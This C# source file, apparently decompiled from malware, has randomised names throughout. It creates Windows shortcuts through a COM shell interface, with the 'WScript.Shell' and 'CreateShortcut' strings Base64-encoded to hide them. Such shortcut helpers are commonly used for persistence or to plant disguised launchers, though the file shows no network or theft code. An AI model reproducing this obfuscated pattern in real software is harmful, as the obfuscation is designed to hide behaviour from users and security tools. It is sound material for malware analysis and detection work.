using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace kuMeqwHpurUBOD;

public class MfgvfCTaoTui
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface azxxckTlRopj
	{
		[DispId(0)]
		string vnctpshMiADHWFF
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string awvcwJOOUCTP
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string CHwWuZpCtUl
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string ZiKqToFzcBkat
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string meGLBsRFQeuO
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string xhjwlNcAAuYbmv
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string BYAdKpLTGUdhq
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int uTgNFPMkGwoGRAW
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string KxKqpJcxZRYhgZ
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type TyDajDmFuwD = Type.GetTypeFromProgID(BErRpdYOfQAwSr.oMKRHTBqYRfOk("V1NjcmlwdC5TaGVsbA=="));

	private static object wpbxAwzADQ = Activator.CreateInstance(TyDajDmFuwD);

	public static void qVeMtrHnSvB(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			azxxckTlRopj azxxckTlRopj = (azxxckTlRopj)TyDajDmFuwD.InvokeMember(BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, wpbxAwzADQ, new object[1] { string_0 });
			azxxckTlRopj.CHwWuZpCtUl = string_4;
			azxxckTlRopj.ZiKqToFzcBkat = string_5;
			azxxckTlRopj.BYAdKpLTGUdhq = string_1;
			azxxckTlRopj.KxKqpJcxZRYhgZ = string_3;
			azxxckTlRopj.awvcwJOOUCTP = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				azxxckTlRopj.meGLBsRFQeuO = string_6;
			}
			azxxckTlRopj.Save();
		}
		catch (Exception ex)
		{
			if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
